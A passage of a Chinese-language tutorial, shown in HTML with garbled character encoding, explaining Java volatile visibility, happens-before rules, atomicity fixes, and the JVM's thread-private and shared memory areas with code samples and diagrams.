        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ä¿®æ”¹å·¥ä½œå†…å­˜ä¸­çš„å‰¯æœ¬ï¼Œå¯èƒ½è¿˜æ²¡å†™å›ä¸»å†…å­˜</span>
            System.out.println(<span class="hljs-string">"çº¿ç¨‹1ï¼šflagå·²è®¾ç½®ä¸ºtrue"</span>);
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2ï¼šè¯»å–flag</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (!flag) {
                <span class="hljs-comment">// ä»å·¥ä½œå†…å­˜è¯»å–ï¼Œå¯èƒ½çœ‹ä¸åˆ°çº¿ç¨‹1çš„ä¿®æ”¹</span>
                <span class="hljs-comment">// å¯¼è‡´æ— é™å¾ªç¯ï¼</span>
            }
            System.out.println(<span class="hljs-string">"çº¿ç¨‹2ï¼šæ£€æµ‹åˆ°flagä¸ºtrue"</span>);
        });
        
        thread2.start();
        thread1.start();
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatile</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// volatileä¿è¯å¯è§æ€§</span>
</code></pre>
<h4 data-id="heading-5">1.3 happens-beforeè§„åˆ™ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>happens-beforeå…³ç³»çš„å«ä¹‰ï¼š</strong></p>
<p>happens-beforeæ˜¯JMMä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºæè¿°ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„ååºå…³ç³»ã€‚å¦‚æœæ“ä½œA happens-beforeæ“ä½œBï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li>æ“ä½œAçš„ç»“æœå¯¹æ“ä½œBå¯è§</li>
<li>æ“ä½œAåœ¨æ“ä½œBä¹‹å‰æ‰§è¡Œ</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong> happens-beforeä¸ç­‰äºæ—¶é—´å…ˆåé¡ºåºï¼Œä½†å¦‚æœæœ‰happens-beforeå…³ç³»ï¼Œåˆ™ä¿è¯å¯è§æ€§ã€‚</p>
<p><strong>ä¸»è¦çš„happens-beforeè§„åˆ™ï¼š</strong></p>
<ol>
<li><strong>ç¨‹åºé¡ºåºè§„åˆ™</strong>ï¼šåŒä¸€çº¿ç¨‹å†…ï¼Œå‰é¢çš„æ“ä½œhappens-beforeåé¢çš„æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// æ“ä½œ1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x + <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ2ï¼šæ“ä½œ1 happens-before æ“ä½œ2</span>
</code></pre>
<ol start="2">
<li><strong>ç›‘è§†å™¨é”è§„åˆ™</strong>ï¼šè§£é”æ“ä½œhappens-beforeåŠ é”æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span> (lock) {
    x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ1</span>
}  <span class="hljs-comment">// è§£é”</span>

<span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// åŠ é”ï¼šè§£é” happens-before åŠ é”</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x;  <span class="hljs-comment">// èƒ½çœ‹åˆ°x=1</span>
}
</code></pre>
<ol start="3">
<li><strong>volatileå˜é‡è§„åˆ™</strong>ï¼švolatileå†™æ“ä½œhappens-before volatileè¯»æ“ä½œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// çº¿ç¨‹1</span>
flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å†™æ“ä½œ</span>

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">if</span> (flag) {  <span class="hljs-comment">// è¯»æ“ä½œï¼šå†™ happens-before è¯»</span>
    <span class="hljs-comment">// èƒ½ç«‹å³çœ‹åˆ°flag=true</span>
}
</code></pre>
<ol start="4">
<li><strong>ä¼ é€’æ€§è§„åˆ™</strong>ï¼šå¦‚æœA happens-before Bï¼ŒB happens-before Cï¼Œåˆ™A happens-before C</li>
</ol>
<h4 data-id="heading-6">1.4 volatileå…³é”®å­—ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>volatileçš„ç‰¹æ€§ï¼š</strong></p>
<ol>
<li><strong>ä¿è¯å¯è§æ€§</strong>ï¼švolatileå˜é‡å¯¹æ‰€æœ‰çº¿ç¨‹ç«‹å³å¯è§</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ä¿è¯å¯è§æ€§</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlag</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ä¿®æ”¹åç«‹å³å¯¹æ‰€æœ‰çº¿ç¨‹å¯è§</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">getFlag</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> flag;  <span class="hljs-comment">// èƒ½ç«‹å³çœ‹åˆ°æœ€æ–°å€¼</span>
}
</code></pre>
<ol start="2">
<li><strong>ç¦æ­¢æŒ‡ä»¤é‡æ’åº</strong>ï¼švolatileå˜é‡çš„è¯»å†™æ“ä½œä¸ä¼šè¢«é‡æ’åº</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ready</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">()</span> {
    value = <span class="hljs-number">42</span>;    <span class="hljs-comment">// æ“ä½œ1</span>
    ready = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ“ä½œ2ï¼šä¸ä¼šè¢«é‡æ’åºåˆ°æ“ä½œ1ä¹‹å‰</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (ready) {           <span class="hljs-comment">// æ“ä½œ3</span>
        System.out.println(value);  <span class="hljs-comment">// èƒ½ä¿è¯çœ‹åˆ°value=42</span>
    }
}
</code></pre>
<ol start="3">
<li><strong>ä¸ä¿è¯åŸå­æ€§</strong>ï¼švolatileä¸èƒ½ä¿è¯å¤åˆæ“ä½œçš„åŸå­æ€§</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// è¿™ä¸æ˜¯åŸå­æ“ä½œï¼</span>
    <span class="hljs-comment">// ç›¸å½“äºï¼š</span>
    <span class="hljs-comment">// int temp = count;</span>
    <span class="hljs-comment">// temp = temp + 1;</span>
    <span class="hljs-comment">// count = temp;</span>
    <span class="hljs-comment">// è¿™ä¸‰ä¸ªæ“ä½œä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
}
</code></pre>
<p><strong>æ­£ç¡®åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨synchronized</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// ä¿è¯åŸå­æ€§</span>
}

<span class="hljs-comment">// æˆ–ä½¿ç”¨AtomicInteger</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œ</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-7">ç¬¬äºŒéƒ¨åˆ†ï¼šJVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼ˆå›¾è¡¨+è¯¦è§£ï¼‰</h2>
<h3 data-id="heading-8">2. JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„å›¾</h3>
<h4 data-id="heading-9">2.1 æ•´ä½“æ¶æ„å›¾ï¼ˆé‡ç‚¹ï¼‰</h4>
<pre><code class="hljs language-scss" lang="scss">JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¨‹åºè®¡æ•°å™¨ (ç§æœ‰)   â”‚
â”‚  è™šæ‹Ÿæœºæ ˆ (ç§æœ‰)     â”‚
â”‚  æœ¬åœ°æ–¹æ³•æ ˆ (ç§æœ‰)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Javaå † (å…±äº«)     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚æ–°ç”Ÿä»£â”‚  â”‚è€å¹´ä»£â”‚  â”‚
â”‚  â”‚ Eden â”‚  â”‚     â”‚  â”‚
â”‚  â”‚ S0S1 â”‚  â”‚     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   æ–¹æ³•åŒº (å…±äº«)      â”‚
â”‚  è¿è¡Œæ—¶å¸¸é‡æ±         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç›´æ¥å†…å­˜ (å †å¤–)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ¶æ„è¯´æ˜ï¼š</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<ol>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼ˆæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹ï¼‰ï¼š</p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨</li>
<li>è™šæ‹Ÿæœºæ ˆ</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆ</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼ˆæ‰€æœ‰çº¿ç¨‹å…±äº«ï¼‰ï¼š</p>
<ul>
<li>Javaå †</li>
<li>æ–¹æ³•åŒº</li>
</ul>
</li>
<li>
<p><strong>ç›´æ¥å†…å­˜</strong>ï¼ˆå †å¤–å†…å­˜ï¼‰ï¼š</p>
<ul>
<li>NIOä½¿ç”¨ï¼Œä¸å±äºJVMè¿è¡Œæ—¶æ•°æ®åŒº</li>
</ul>
</li>
</ol>
<h4 data-id="heading-10">2.2 å†…å­˜åŒºåŸŸåˆ†ç±»è¯´æ˜</h4>
<p><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸï¼š</strong></p>
<p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ç§æœ‰åŒºåŸŸï¼Œç§æœ‰åŒºåŸŸéšç€çº¿ç¨‹çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œéšç€çº¿ç¨‹çš„é”€æ¯è€Œé”€æ¯ã€‚</p>
<ul>
<li><strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼šè®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li><strong>è™šæ‹Ÿæœºæ ˆ</strong>ï¼šå­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ç­‰</li>
<li><strong>æœ¬åœ°æ–¹æ³•æ ˆ</strong>ï¼šä¸ºNativeæ–¹æ³•æœåŠ¡</li>
</ul>
<p><strong>çº¿ç¨‹å…±äº«åŒºåŸŸï¼š</strong></p>
<p>æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€å—å†…å­˜åŒºåŸŸï¼Œå…±äº«åŒºåŸŸåœ¨JVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯ã€‚</p>
<ul>
<li><strong>Javaå †</strong>ï¼šå­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li><strong>æ–¹æ³•åŒº</strong>ï¼šå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰</li>
</ul>
<h4 data-id="heading-11">2.3 çº¿ç¨‹ç§æœ‰åŒºåŸŸä¸å…±äº«åŒºåŸŸçš„åŒºåˆ«å’Œä½œç”¨</h4>
<h5 data-id="heading-12">2.3.1 çº¿ç¨‹ç§æœ‰åŒºåŸŸ</h5>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>çº¿ç¨‹ç§æœ‰åŒºåŸŸæ˜¯æ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹æ‹¥æœ‰çš„å†…å­˜åŒºåŸŸï¼Œçº¿ç¨‹ä¹‹é—´æ— æ³•è®¿é—®å¯¹æ–¹çš„ç§æœ‰åŒºåŸŸã€‚ç§æœ‰åŒºåŸŸéšç€çº¿ç¨‹çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œéšç€çº¿ç¨‹çš„é”€æ¯è€Œé”€æ¯ã€‚</p>
<p><strong>åŒ…å«çš„åŒºåŸŸï¼š</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨</li>
<li>Javaè™šæ‹Ÿæœºæ ˆ</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆ</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>å­˜å‚¨çº¿ç¨‹ç§æœ‰çš„æ•°æ®</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•å†…éƒ¨çš„å˜é‡</li>
<li>æ–¹æ³•å‚æ•°ï¼šæ–¹æ³•çš„å‚æ•°</li>
<li>è¿”å›å€¼ï¼šæ–¹æ³•çš„è¿”å›å€¼</li>
<li>ä¸­é—´ç»“æœï¼šè®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸´æ—¶æ•°æ®</li>
</ul>
</li>
<li>
<p><strong>è®°å½•çº¿ç¨‹çš„æ‰§è¡ŒçŠ¶æ€</strong></p>
<ul>
<li>å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ä½ç½®ï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰</li>
<li>æ–¹æ³•è°ƒç”¨æ ˆï¼ˆè™šæ‹Ÿæœºæ ˆï¼‰</li>
<li>å¼‚å¸¸å¤„ç†ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>ä¿è¯çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</li>
<li>å¤©ç„¶çº¿ç¨‹å®‰å…¨</li>
<li>é¿å…æ•°æ®ç«äº‰</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œæœºåˆ¶ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">çº¿ç¨‹ç§æœ‰åŒºåŸŸï¼š

çº¿ç¨‹1: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>
çº¿ç¨‹2: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>
çº¿ç¨‹3: <span class="hljs-section">[ç¨‹åºè®¡æ•°å™¨]</span> <span class="hljs-section">[è™šæ‹Ÿæœºæ ˆ]</span> <span class="hljs-section">[æœ¬åœ°æ–¹æ³•æ ˆ]</span>

æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰åŒºåŸŸå®Œå…¨ç‹¬ç«‹
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateAreaExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å±€éƒ¨å˜é‡å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆè™šæ‹Ÿæœºæ ˆï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„localVarå‰¯æœ¬</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"test"</span>;  <span class="hljs-comment">// å¯¹è±¡å¼•ç”¨åœ¨æ ˆä¸­ï¼Œå¯¹è±¡æœ¬èº«åœ¨å †ä¸­</span>
    }
}

<span class="hljs-comment">// å¤šçº¿ç¨‹æ‰§è¡Œ</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">PrivateAreaExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivateAreaExample</span>();
    obj.method();  <span class="hljs-comment">// çº¿ç¨‹1æœ‰è‡ªå·±çš„æ ˆï¼Œå­˜å‚¨è‡ªå·±çš„localVar</span>
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">PrivateAreaExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivateAreaExample</span>();
    obj.method();  <span class="hljs-comment">// çº¿ç¨‹2æœ‰è‡ªå·±çš„æ ˆï¼Œå­˜å‚¨è‡ªå·±çš„localVar</span>
});

<span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹çš„localVarå®Œå…¨ç‹¬ç«‹ï¼Œäº’ä¸å½±å“</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>çº¿ç¨‹é—´éš”ç¦»</strong>ï¼šæ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰åŒºåŸŸå®Œå…¨ç‹¬ç«‹ï¼Œäº’ä¸å½±å“</li>
<li><strong>è®¿é—®é€Ÿåº¦å¿«</strong>ï¼šæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œç›´æ¥è®¿é—®ï¼Œé€Ÿåº¦å¿«</li>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šå†…å­˜å ç”¨ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„æ ˆï¼‰</li>
</ol>
<h5 data-id="heading-13">2.3.2 çº¿ç¨‹å…±äº«åŒºåŸŸ</h5>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>çº¿ç¨‹å…±äº«åŒºåŸŸæ˜¯æ‰€æœ‰çº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œå…±äº«åŒºåŸŸåœ¨JVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯ã€‚æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®å…±äº«åŒºåŸŸã€‚</p>
<p><strong>åŒ…å«çš„åŒºåŸŸï¼š</strong></p>
<ul>
<li>Javaå †ï¼šå­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li>æ–¹æ³•åŒºï¼šå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰ï¼ˆåŒ…æ‹¬è¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>å­˜å‚¨å…±äº«æ•°æ®</strong></p>
<ul>
<li>å¯¹è±¡å®ä¾‹ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®çš„å¯¹è±¡</li>
<li>ç±»ä¿¡æ¯ï¼šç±»çš„å…ƒæ•°æ®ï¼Œæ‰€æœ‰çº¿ç¨‹å…±äº«</li>
<li>å¸¸é‡ï¼šå­—ç¬¦ä¸²å¸¸é‡ç­‰</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹é—´é€šä¿¡</strong></p>
<ul>
<li>çº¿ç¨‹é€šè¿‡å…±äº«åŒºåŸŸè¿›è¡Œæ•°æ®äº¤æ¢</li>
<li>ä¸€ä¸ªçº¿ç¨‹åˆ›å»ºçš„å¯¹è±¡ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥é€šè¿‡å¼•ç”¨è®¿é—®</li>
</ul>
</li>
<li>
<p><strong>èµ„æºå…±äº«</strong></p>
<ul>
<li>å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªå¯¹è±¡</li>
<li>å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªç±»ä¿¡æ¯</li>
<li>æé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œæœºåˆ¶ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">çº¿ç¨‹å…±äº«åŒºåŸŸï¼š

     <span class="hljs-selector-attr">[Javaå †]</span> <span class="hljs-selector-attr">[æ–¹æ³•åŒº]</span>
        â†‘      â†‘
        â”‚      â”‚
   â”Œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”
   â”‚    â”‚      â”‚  â”‚
çº¿ç¨‹<span class="hljs-number">1</span>  çº¿ç¨‹<span class="hljs-number">2</span>  çº¿ç¨‹<span class="hljs-number">3</span>

æ‰€æœ‰çº¿ç¨‹å…±äº«å †å’Œæ–¹æ³•åŒº
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡å­˜å‚¨åœ¨æ–¹æ³•åŒºï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">sharedCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ‰€æœ‰çº¿ç¨‹å…±äº«</span>
    
    <span class="hljs-comment">// å®ä¾‹å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">instanceCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œæ‰€æœ‰çº¿ç¨‹å¯ä»¥é€šè¿‡å¼•ç”¨è®¿é—®</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è®¿é—®å…±äº«å˜é‡ï¼Œéœ€è¦åŒæ­¥</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            sharedCount++;  <span class="hljs-comment">// æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€ä¸ªsharedCount</span>
            instanceCount++;
        }
    }
}

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªå¯¹è±¡</span>
<span class="hljs-type">SharedAreaExample</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedAreaExample</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    shared.increment();  <span class="hljs-comment">// çº¿ç¨‹1è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    shared.increment();  <span class="hljs-comment">// çº¿ç¨‹2ä¹Ÿè®¿é—®åŒä¸€ä¸ªå¯¹è±¡</span>
});

<span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªsharedå¯¹è±¡ï¼Œéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>çº¿ç¨‹é—´å…±äº«</strong>ï¼šæ‰€æœ‰çº¿ç¨‹å¯ä»¥è®¿é—®åŒä¸€ä¸ªå…±äº«åŒºåŸŸ</li>
<li><strong>éœ€è¦åŒæ­¥æœºåˆ¶</strong>ï¼šå¤šä¸ªçº¿ç¨‹è®¿é—®å…±äº«æ•°æ®æ—¶ï¼Œéœ€è¦ä½¿ç”¨synchronizedã€volatileç­‰æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šå†…å­˜å ç”¨ä¸å¯¹è±¡æ•°é‡ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</li>
<li><strong>GCçš„ä¸»è¦åŒºåŸŸ</strong>ï¼šå…±äº«åŒºåŸŸæ˜¯åƒåœ¾å›æ”¶çš„ä¸»è¦åŒºåŸŸ</li>
</ol>
<h5 data-id="heading-14">2.3.3 ä¸¤è€…çš„åŒºåˆ«å¯¹æ¯”</h5>


















































